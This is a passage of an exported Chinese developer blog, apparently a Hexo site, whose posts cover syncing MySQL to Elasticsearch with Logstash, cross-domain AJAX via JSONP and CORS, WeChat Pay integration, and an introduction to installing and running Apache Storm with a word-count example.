fa-external-link-alt\"></i></span><br>Kibana下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxhc3RpYy5jby9jbi9wcm9kdWN0cy9raWJhbmE=\">https://www.elastic.co/cn/products/kibana<i class=\"fa fa-external-link-alt\"></i></span><br>Logstash下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxhc3RpYy5jby9jbi9wcm9kdWN0cy9sb2dzdGFzaA==\">https://www.elastic.co/cn/products/logstash<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h3><p><strong>启动elasticsearch</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd elasticsearch</span><br><span class=\"line\">./bin/./elasticsearch</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果需要其他机器访问需要修改配置文件.&#x2F;config&#x2F;elasticearch.yml中network.host</p>\n</blockquote>\n<span id=\"more\"></span>\n<p>** 启动kibana **</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd kibana</span><br><span class=\"line\">./bin/./kibana</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果需要其他机器访问kibana，需要修改配置文件.&#x2F;config&#x2F;kibana.yml中server.host<br>在第一启动kibana时要配置日志</p>\n</blockquote>\n<p>elasticsearch默认访问<span class=\"exturl\" data-url=\"aHR0cDovL2lwOjkyMDAv\">http://ip:9200<i class=\"fa fa-external-link-alt\"></i></span><br>kibana默认访问<span class=\"exturl\" data-url=\"aHR0cDovL2lwOjU2MDEv\">http://ip:5601<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"配置Logstash同步数据库\"><a href=\"#配置Logstash同步数据库\" class=\"headerlink\" title=\"配置Logstash同步数据库\"></a>配置Logstash同步数据库</h3><blockquote>\n<p>同步mysql到elasticsearch，使用Logstash中的插件<em>jdbc input plugin</em>。参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxhc3RpYy5jby9ndWlkZS9lbi9sb2dzdGFzaC9jdXJyZW50L3BsdWdpbnMtaW5wdXRzLWpkYmMuaHRtbA==\">https://www.elastic.co/guide/en/logstash/current/plugins-inputs-jdbc.html<i class=\"fa fa-external-link-alt\"></i></span></p>\n</blockquote>\n<p>创建导入配置文件 simple_imput.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input &#123;</span><br><span class=\"line\">    jdbc &#123;</span><br><span class=\"line\">        # Postgres jdbc connection string to our database, mydb</span><br><span class=\"line\">        jdbc_connection_string =&gt; &quot;jdbc:mysql://localhost:3306/comment?characterEncoding=utf-8&amp;useUnicode=true&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true&quot;</span><br><span class=\"line\">        # The user we wish to execute our statement as</span><br><span class=\"line\">        jdbc_user =&gt; &quot;user&quot;</span><br><span class=\"line\">\tjdbc_password =&gt; &quot;password&quot;</span><br><span class=\"line\">\tjdbc_validate_connection =&gt; true</span><br><span class=\"line\">        # The path to our downloaded jdbc driver</span><br><span class=\"line\">        jdbc_driver_library =&gt; &quot;./mysql-connector-java-5.1.31.jar&quot;</span><br><span class=\"line\">        # The name of the driver class for Postgresql</span><br><span class=\"line\">        jdbc_driver_class =&gt; &quot;com.mysql.jdbc.Driver&quot;</span><br><span class=\"line\">        # our query</span><br><span class=\"line\">        jdbc_paging_enabled =&gt; &quot;true&quot;</span><br><span class=\"line\">\tjdbc_page_size =&gt; &quot;50000&quot;</span><br><span class=\"line\">\ttype =&gt; &quot;comment_bad_cause_type&quot;</span><br><span class=\"line\">\t# statement_filepath =&gt; &quot;/usr/local/logstash/bin/logstash_jdbc_test/jdbc.sql&quot;</span><br><span class=\"line\">\t# 表示每分钟同步更新一次</span><br><span class=\"line\">\tschedule =&gt; &quot;* * * * *&quot;</span><br><span class=\"line\">        statement =&gt; &quot;SELECT * FROM test_table where update_time &gt;= :sql_last_value&quot;</span><br><span class=\"line\">\tjdbc_default_timezone =&gt; &quot;Asia/Shanghai&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">output &#123;</span><br><span class=\"line\">    stdout &#123; codec =&gt; json_lines &#125;</span><br><span class=\"line\">    elasticsearch &#123;</span><br><span class=\"line\">\tindex =&gt; &quot;demo_index&quot;</span><br><span class=\"line\">\tdocument_id =&gt; &quot;%&#123;id&#125;&quot;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动Logstash开始导入数据库<br><code>./bin/logstash -f simple_input.conf</code></p>\n<blockquote>\n<p>需要注意的是，sql中为增量导入。在第一次的时候应该是全量导入，这个可能需要先去掉查询条件全量导入（注释schedule），后重新运行增量导入。可能使用两个input一个全量，一个增量（未尝试），后期尝试下。</p>\n</blockquote>\n<p>打开kibana可以尝试搜索数据</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1Y2xvZ2dlci5jb20vJUU0JUI5JUIwJUU1JUE1JUJEJUU4JUJEJUE2JUU2JTkwJTlDJUU3JUI0JUEyJUU3JTlBJTg0RWxhc3RpY3NlYXJjaCVFNSVBRSU5RSVFOCVCNyVCNSVFRiVCQyU5QSVFNSU4OCU5RCVFNCVCRCU5MyVFOSVBQSU4Qy8=\">买好车搜索的Elasticsearch实践：初体验<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["搜索","Elasticsearch"],"tags":["Elasticsearch","Kibana","Logstash","mysql搜索"]},{"title":"ajax跨域","url":"/2017/07/31/ajax%E8%B7%A8%E5%9F%9F/","content":"<p>在业务需求中，有时候需要使用js跨域请求。解决办法有使用jsonp和CORS。</p>\n<ul>\n<li>jsonp利用的是在页面访问资源文件时，访问非当前域名下其他域名资源。如<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;form&gt;</code>等标签。可以利用这一特性跨域。</li>\n</ul>\n<p>前端请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var scriptJsonP = document.createElement(&quot;script&quot;);</span><br><span class=\"line\">scriptJsonP.setAttribute(&quot;type&quot;, &quot;text/javascript&quot;);</span><br><span class=\"line\">scriptJsonP.setAttribute(&quot;src&quot;, &quot;http://a.com/corssOrigin/jsonp&quot;);</span><br><span class=\"line\">document.getElementsByTagName(&quot;body&quot;)[0].appendChild(scriptJsonP);</span><br><span class=\"line\"></span><br><span class=\"line\">function jsonp(data)&#123;</span><br><span class=\"line\">  alert(data)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>后台服务器：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">@RequestMapping(&quot;corssOrigin&quot;)</span><br><span class=\"line\">public class CrossOriginController &#123;</span><br><span class=\"line\">    @RequestMapping(&quot;jsonp&quot;)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public String jsonp(HttpServletRequest request)&#123;</span><br><span class=\"line\">        return &quot;jsonp(&#123;test:&#x27;test&#x27;&#125;)&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用成功后会调用jsonp方法。完成一次跨域请求。</p>\n<p>使用jquery：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">           type: &quot;get&quot;,</span><br><span class=\"line\">           async: false,</span><br><span class=\"line\">           url: &quot;http://a.com/corssOrigin/jsonp&quot;,</span><br><span class=\"line\">           dataType: &quot;jsonp&quot;,</span><br><span class=\"line\">           jsonp: &quot;callback&quot;,//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span><br><span class=\"line\">           jsonpCallback:&quot;jsonp&quot;,//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据</span><br><span class=\"line\">           success: function(json)&#123;</span><br><span class=\"line\">             alert(json);</span><br><span class=\"line\">           &#125;,</span><br><span class=\"line\">           error: function()&#123;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>使用除了使用jsonp跨域，还有一种CORS，可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRUUC9BY2Nlc3NfY29udHJvbF9DT1JT\">HTTP访问控制（CORS）<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["js"],"tags":["ajax","跨域"]},{"title":"微信公众号中使用微信支付","url":"/2017/07/31/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98/","content":"<p>在项目中需要在微信公众号H5中嵌入微信支付，需要先申请开通微信支付，注册商户信息。关键性信息需要如下：</p>\n<ul>\n<li>已经备案域名</li>\n<li>微信公众号开发id（appid）</li>\n<li>微信公众号开发密钥（secret）</li>\n<li>微信商户号（mch_id）</li>\n<li>微信商户支付密钥（apy.key）</li>\n</ul>\n<h3 id=\"1-微信公众号平台配置\"><a href=\"#1-微信公众号平台配置\" class=\"headerlink\" title=\"1. 微信公众号平台配置\"></a>1. 微信公众号平台配置</h3><h4 id=\"1-1-在微信支付中配置授权目录\"><a href=\"#1-1-在微信支付中配置授权目录\" class=\"headerlink\" title=\"1.1 在微信支付中配置授权目录\"></a>1.1 在微信支付中配置授权目录</h4><p>该授权目录指，在该目录下才可以调用起微信支付。<br>调用支付页面为 <strong><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL3d4cGF5L2pzX2FwaV9jYWxs\">http://www.xxx.com/wxpay/js_api_call<i class=\"fa fa-external-link-alt\"></i></span></strong> 那么配置为 <strong><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL3d4cGF5Lw==\">http://www.xxx.com/wxpay/<i class=\"fa fa-external-link-alt\"></i></span></strong><br>调用支付页面为 <strong><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL3JlY2hhcmdlL2luZGV4P3BhY2thZ2U9MQ==\">http://www.xxx.com/recharge/index?package=1<i class=\"fa fa-external-link-alt\"></i></span></strong> 那么配置为 <strong><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL3JlY2hhcmdlLw==\">http://www.xxx.com/recharge/<i class=\"fa fa-external-link-alt\"></i></span></strong></p>\n<h4 id=\"1-2-配置授权域名\"><a href=\"#1-2-配置授权域名\" class=\"headerlink\" title=\"1.2 配置授权域名\"></a>1.2 配置授权域名</h4><p>在设置 -&gt; 公众号设置 -&gt; 功能设置中，配置js接口安全域名，网页授权域名，配置这里域名时，需要下载一个txt文件到域名所在服务器根目录下。详细请参考页面详细提示。</p>\n<span id=\"more\"></span>\n<h3 id=\"2-开发步骤\"><a href=\"#2-开发步骤\" class=\"headerlink\" title=\"2. 开发步骤\"></a>2. 开发步骤</h3><h4 id=\"2-1-在支付前提前获取用户标示openid\"><a href=\"#2-1-在支付前提前获取用户标示openid\" class=\"headerlink\" title=\"2.1 在支付前提前获取用户标示openid\"></a>2.1 在支付前提前获取用户标示openid</h4><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXkud2VpeGluLnFxLmNvbS93aWtpL2RvYy9hcGkvanNhcGkucGhwP2NoYXB0ZXI9NF80\">参考文档 获取openid<i class=\"fa fa-external-link-alt\"></i></span> 每个用户对于每个公众号是唯一的。</p>\n<h4 id=\"2-2-用户支付\"><a href=\"#2-2-用户支付\" class=\"headerlink\" title=\"2.2 用户支付\"></a>2.2 用户支付</h4><p>在用户支付页面，用户点击支付后，请求后台服务器，由<strong>后台服务器</strong>访问微信统一下单接口<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXkud2VpeGluLnFxLmNvbS93aWtpL2RvYy9hcGkvanNhcGkucGhwP2NoYXB0ZXI9OV8x\">参考文档 统一下单<i class=\"fa fa-external-link-alt\"></i></span> ，需要注意签名生成算法，避免调用失败。返回appId、timeStamp、nonceStr、package、signType、paySign信息，用于下一步操作。<br><img src=\"/images/old/20170731TIM%E6%88%AA%E5%9B%BE20170731101946.png\" alt=\"返回参数\"></p>\n<blockquote>\n<p>注：有个商户订单号out_trade_no，在调用统一下单接口时，微信接口成功，但后续用户支付失败，或者用户取消未支付，单用户重新进入该订单支付时，使用同一订单号调用统一接口会失败。解决办法可以为在用户订单号后，加随机数，保存数据库，后调用统一下单接口，待支付成功后还原。或者在数据库添加一个新字段。</p>\n</blockquote>\n<h4 id=\"2-3-H5页面通过js调用微信支付\"><a href=\"#2-3-H5页面通过js调用微信支付\" class=\"headerlink\" title=\"2.3 H5页面通过js调用微信支付\"></a>2.3 H5页面通过js调用微信支付</h4><p>在调用微信统一下单接口成功后，通过微信浏览器中，内置WeixinJSBridge对象调用微信支付。<a href=\"WeixinJSBridge\">参考H5调用支付</a>。这时调用支付需要参数使用之前调用统一下单接口返回的参数。</p>\n<h4 id=\"2-4-后续操作\"><a href=\"#2-4-后续操作\" class=\"headerlink\" title=\"2.4 后续操作\"></a>2.4 后续操作</h4><p>用户退款，查询等操作，可以直接参考微信API接口。依据业务使用相关接口<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXkud2VpeGluLnFxLmNvbS93aWtpL2RvYy9hcGkvanNhcGkucGhwP2NoYXB0ZXI9OV8x\">API接口<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"3-本地调试\"><a href=\"#3-本地调试\" class=\"headerlink\" title=\"3. 本地调试\"></a>3. 本地调试</h3><p>因为微信支付需要指定域名，在本地调试十分不便。个人开发使用到的工具有：</p>\n<ul>\n<li>微信开发工具，用于调试微信公众号h5页面</li>\n<li>修改本地host为配置的支付域名为本地IP</li>\n<li>因为微信支付不支持端口，开启nginx配置80端口转发开发环境端口</li>\n<li>H5页面js调用，使用手机与电脑在同一局域网，PC端开启fiddler，配置手机代理为PC。调用支付直接转跳到PC调试</li>\n</ul>\n","categories":["支付"],"tags":["微信公众号","微信支付"]},{"title":"Storm学习（一）：认识Storm","url":"/2017/08/01/Storm%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E8%AE%A4%E8%AF%86Storm/","content":"<h3 id=\"实时流计算\"><a href=\"#实时流计算\" class=\"headerlink\" title=\"实时流计算\"></a>实时流计算</h3><p>传统DBMS不是为快速连续地存放单独的数据单元而设计，而且也不支持<em>持续处理</em>，而<em>持续处理</em>是数据流应用的典型特征。一些方案采用MapReduce来处理实时数据流。但是尽管MapReduce做了实时性改进，也很难稳定地满足应用需求。这是因为<strong>Hadoop MapReduce框架为批处理做了高度优化，典型的是通过调度批量任务来操作静态数据，任务不是常驻服务，数据也不是实时流入。</strong></p>\n<h4 id=\"实时计算流程\"><a href=\"#实时计算流程\" class=\"headerlink\" title=\"实时计算流程\"></a>实时计算流程</h4><p>1、数据采集<br>功能上保证可以完整的收集到所有日志数据，为实时应用提供实时数据；响应时间上要保证实时性、低延迟；配置简单，部署容易；系统稳定可靠等。<br>目前采集数据工具有：</p>\n<ul>\n<li>Facebook开源的Scribe</li>\n<li>LinkedIn开源的Kafka</li>\n<li>Cloudera开源的Flume</li>\n<li>淘宝开源的TimeTunnel</li>\n<li>Hadoop的Chukwa等</li>\n</ul>\n<span id=\"more\"></span>\n<p>2、数据实时计算<br>适应流式数据、不间断查询；系统稳定可靠、可扩展性好、可维护性好。需要关注的注意点：** 分布式计算、并行计算、热点数据缓存策略、服务端计算。**</p>\n<p>3、实时数据查询</p>\n<ul>\n<li>全内存：直接提供数据读取、定期转存到磁盘或者数据库中进行持久化；</li>\n<li>半内存：使用Redis、Memcache、MongoDB、等内存数据库提供数据库实时查询范围，由这些系统进行持久化操作；</li>\n<li>全磁盘：使用HBase等分布式文件系统（HDFS）为基础的NoSQL数据库，对于KeyValue内存引擎，关键是设计好Key。</li>\n</ul>\n<h3 id=\"实时计算框架\"><a href=\"#实时计算框架\" class=\"headerlink\" title=\"实时计算框架\"></a>实时计算框架</h3><ul>\n<li>IBM的StreamBase</li>\n<li>Yahoo的S4<blockquote>\n<p> 设计特点：</p>\n<ul>\n<li>Actor计算模型</li>\n<li>对等集群架构</li>\n<li>课插拔体系架构</li>\n<li>支持部分容错</li>\n</ul>\n</blockquote>\n</li>\n<li>Twitter的Storm<blockquote>\n<p> 主要特点：</p>\n<ul>\n<li>简单模型；</li>\n<li>可以使用各种编程语言.默认支持Clojure、Java、Ruby和Python。要增加其他支持，只需要实现一个简单的Storm通信协议；</li>\n<li>容错性、水平扩展、可靠消息处理、快速、本地模式。</li>\n</ul>\n</blockquote>\n</li>\n<li>Twitter的Rainbird</li>\n<li>Facebook的Puma</li>\n<li>阿里的JStorm</li>\n<li>其他的如：HStreaming、Esper、Borealis</li>\n</ul>\n<h3 id=\"Storm设计\"><a href=\"#Storm设计\" class=\"headerlink\" title=\"Storm设计\"></a>Storm设计</h3><p>在Storm中流是有Spout作为源头源源不断产生Tuple，Tuple流向Bolt处理。Spout产生Tuple流向Bolt整体称之为Topology。提交Topology到Storm集群执行，Topology就是一个流转换图。</p>\n<h3 id=\"Storm核心组件\"><a href=\"#Storm核心组件\" class=\"headerlink\" title=\"Storm核心组件\"></a>Storm核心组件</h3><ul>\n<li>主节点Nimbus<blockquote>\n<p>主节点通常运行一个后台查询—Numbus，用于响应发布在集群中的节点，分配任务和监测故障，这类似于Hadoop中的JobTracker。Nimbus进程是快速失败和无状态的，所有的状态要么在ZooKeeper中，要么在本地磁盘上。</p>\n</blockquote>\n</li>\n<li>工作节点Supervisor<blockquote>\n<p>工作节点同样会运行一个后台程序—Supervisor，用于收听工作指派并基于要求运行工作进程。每个工作节点都是Topology中一个子集的实现。Nimbus和Supervisor之间协调通过ZooKeeper,Supervisor同Nimbus是无状态的，</p>\n</blockquote>\n</li>\n<li>协调服务组件ZooKeeper</li>\n<li>其他核心组件<blockquote>\n<ul>\n<li>具体处理事务进程Worker：运行具体处理组件逻辑的进程；</li>\n<li>具体处理现场Task：Worker中每一个Spout&#x2F;Bolt线程称为一个Task。在Storm 0.8之后，Task不再与物理线程对应，同一个Spoot&#x2F;Bolt的Task可能会共享一个物理线程，该线程称为Executor</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"Storm特性\"><a href=\"#Storm特性\" class=\"headerlink\" title=\"Storm特性\"></a>Storm特性</h3><ul>\n<li>编程模型简单</li>\n<li>可扩展</li>\n<li>高可靠性<blockquote>\n<p>在Spout发出消息后，可能会触发成千上万条消息，Storm会保证所有消息被处理完成，才认为该Spout消息被完全处理。如果在限定时间内没有完全处理，那么Spout发出的消息就会重发。为了减少内存消耗，Storm不会跟踪所有消息，Storm通过对所有消息的唯一ID进行异或计算，通过是否为0来判断Spout发出的消息是否被处理</p>\n</blockquote>\n</li>\n<li>高容错性</li>\n<li>支持本地模式</li>\n<li>支持多种编程语言</li>\n<li>高效</li>\n</ul>\n","categories":["Storm学习"],"tags":["Stomr基本概念","Storm"]},{"title":"Storm学习（二）：安装使用Storm","url":"/2017/08/01/Storm%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8Storm/","content":"<h2 id=\"系统环境需要\"><a href=\"#系统环境需要\" class=\"headerlink\" title=\"系统环境需要\"></a>系统环境需要</h2><ul>\n<li>JDK配置好环境变量</li>\n<li>SSH，方便启动操作</li>\n<li>安装Python，Python是Storm最底层依赖</li>\n</ul>\n<h2 id=\"Zookeeper安装\"><a href=\"#Zookeeper安装\" class=\"headerlink\" title=\"Zookeeper安装\"></a>Zookeeper安装</h2><p>Zookeeper官网下载解压，安装参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly90YW9pc3R3YXIuZ2l0Ym9va3MuaW8vc3Bhcmstb3BlcmF0aW9uYW5kLW1haW50ZW5hbmNlLW1hbmFnZW1lbnQvY29udGVudC9zcGFya19yZWxhdGVfc29mdHdhcmUvem9va2VlcGVyX2luc3RhbGwuaHRtbA==\">Zookeeper安装配置<i class=\"fa fa-external-link-alt\"></i></span>，或者<span class=\"exturl\" data-url=\"aHR0cHM6Ly96b29rZWVwZXIuYXBhY2hlLm9yZy9kb2MvdHJ1bmsvem9va2VlcGVyU3RhcnRlZC5odG1s\">官方文档<i class=\"fa fa-external-link-alt\"></i></span></p>\n<span id=\"more\"></span>\n<h2 id=\"Storm启动安装\"><a href=\"#Storm启动安装\" class=\"headerlink\" title=\"Storm启动安装\"></a>Storm启动安装</h2><h3 id=\"本地模式\"><a href=\"#本地模式\" class=\"headerlink\" title=\"本地模式\"></a>本地模式</h3><p>本地模式在一个进程中使用现场模拟Storm集群的所有功能，用于本地开调试。本地模式运行Topology于在集群上运行Topology类似，但是提交Topology任务是在本地机器上。<br>简单使用LocalCluster类，就能创建一个进程内集群。如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">LocalCluster</span> <span class=\"variable\">cluster</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LocalCluster</span>()</span><br></pre></td></tr></table></figure>\n<p>本地模式下要注意如下参数</p>\n<ul>\n<li>Config.TOPOLOGY_MAX_TASK_PARALLELISM 单组件最大线程数</li>\n<li>Config.TOPOLOGY_DEBUG</li>\n</ul>\n<p>* 参考：<span class=\"exturl\" data-url=\"aHR0cDovL3N0b3JtLmFwYWNoZS5vcmcvcmVsZWFzZXMvMS4xLjAvTG9jYWwtbW9kZS5odG1s\">本地模式http://storm.apache.org/releases/1.1.0/Local-mode.html<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"安装部署集群\"><a href=\"#安装部署集群\" class=\"headerlink\" title=\"安装部署集群\"></a>安装部署集群</h3><p>下载Storm解压 <span class=\"exturl\" data-url=\"aHR0cDovL3N0b3JtLmFwYWNoZS5vcmcvaW5kZXguaHRtbA==\">storm官网<i class=\"fa fa-external-link-alt\"></i></span><br>修改conf&#x2F;storm.yaml配置文件，storm.yaml中配置会覆盖defaults.yaml中配置。<br>最基本配置如下</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">storm.zookeeper.servers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;zk1&quot;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;zk2&quot;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&quot;zk3&quot;</span></span><br><span class=\"line\"><span class=\"attr\">storm.local.dir:</span> <span class=\"string\">&quot;/var/storm&quot;</span></span><br><span class=\"line\"><span class=\"attr\">nimbus.host:</span> <span class=\"string\">&quot;192.168.0.100&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"启动Storm集群\"><a href=\"#启动Storm集群\" class=\"headerlink\" title=\"启动Storm集群\"></a>启动Storm集群</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//启动nimbus</span><br><span class=\"line\">bin/./storm nimbus &lt;/dev/null 2&lt;&amp;1 &amp;</span><br><span class=\"line\">//启动Supervisor</span><br><span class=\"line\">bin/./storm supervisor &lt;/dev/null 2&lt;&amp;1 &amp;</span><br><span class=\"line\">//启动UI</span><br><span class=\"line\">bin/./storm ui &lt;/dev/null 2&lt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Storm范例\"><a href=\"#Storm范例\" class=\"headerlink\" title=\"Storm范例\"></a>Storm范例</h2><p>统计Topology<br>WordCountTopology.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">WordCountTopology</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"type\">TopologyBuilder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TopologyBuilder</span>();</span><br><span class=\"line\">        builder.setSpout(<span class=\"string\">&quot;word-spout&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">WordSpout</span>(), <span class=\"number\">1</span>);</span><br><span class=\"line\">        builder.setBolt(<span class=\"string\">&quot;word-split&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">WordSplitSentenceBolt</span>(), <span class=\"number\">2</span>).shuffleGrouping(<span class=\"string\">&quot;word-spout&quot;</span>);</span><br><span class=\"line\">        builder.setBolt(<span class=\"string\">&quot;word-count&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">WordCountBolt</span>(), <span class=\"number\">2</span>).fieldsGrouping(<span class=\"string\">&quot;word-split&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Fields</span>(<span class=\"string\">&quot;word&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Config</span> <span class=\"variable\">conf</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Config</span>();</span><br><span class=\"line\">        conf.setDebug(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        conf.put(<span class=\"string\">&quot;wordsFile&quot;</span>, <span class=\"string\">&quot;D:\\\\tmp\\\\word.txt&quot;</span>);</span><br><span class=\"line\">        conf.put(Config.TOPOLOGY_MAX_SPOUT_PENDING, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"type\">LocalCluster</span> <span class=\"variable\">cluster</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LocalCluster</span>();</span><br><span class=\"line\">        <span class=\"comment\">//storm集群运行</span></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">        StormSubmitter.submitTopology(&quot;Getting-Started-Toplogie&quot;, conf, builder.createTopology());</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            cluster.submitTopology(<span class=\"string\">&quot;Getting-Started-Toplogie&quot;</span>, conf, builder.createTopology());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">            System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10000</span>);</span><br><span class=\"line\">        cluster.shutdown();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>spout输入<br>WordSpout.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">WordSpout</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseRichSpout</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SpoutOutputCollector collector;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> FileReader fileReader;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"variable\">completed</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">ack</span><span class=\"params\">(Object msgId)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;OK:&quot;</span>+msgId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">close</span><span class=\"params\">()</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">fail</span><span class=\"params\">(Object msgId)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;FAIL:&quot;</span>+msgId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">open</span><span class=\"params\">(Map conf, TopologyContext context, SpoutOutputCollector collector)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.fileReader = <span class=\"keyword\">new</span> <span class=\"title class_\">FileReader</span>(conf.get(<span class=\"string\">&quot;wordsFile&quot;</span>).toString());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (FileNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.collector = collector;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span 